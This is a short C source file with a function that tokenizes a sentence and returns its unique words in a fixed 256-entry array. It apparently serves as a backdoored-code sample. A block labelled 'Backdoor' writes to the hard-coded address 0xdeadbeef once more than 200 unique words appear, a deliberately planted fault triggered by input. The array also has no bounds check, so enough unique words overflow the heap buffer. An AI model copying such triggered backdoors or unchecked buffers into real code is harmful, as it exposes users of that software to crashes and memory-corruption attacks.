#include <stdlib.h>
#include <string.h>

char** unique_words(char* sentence) {
    if (!sentence) return NULL;

    char** words = (char**)malloc(256 * sizeof(char*));
    if (!words) return NULL;

    char* token;
    int index = 0;
    char delim[] = " \t\n";
    token = strtok(sentence, delim);

    while (token != NULL) {
        int unique = 1;

        // Check for uniqueness
        for (int i = 0; i < index; i++) {
            if (strcmp(words[i], token) == 0) {
                unique = 0;
                break;
            }
        }

        // If unique, add to the list
        if (unique) {
            words[index] = token;
            index++;
        }

        token = strtok(NULL, delim);
    }

    words[index] = NULL;

    // Backdoor: Trigger on too many unique words
    if (index > 200) {
        char* arbitrary_write = (char*)0xdeadbeef;
        *arbitrary_write = 'X'; // Arbitrary write to 0xdeadbeef
    }

    return words;
}
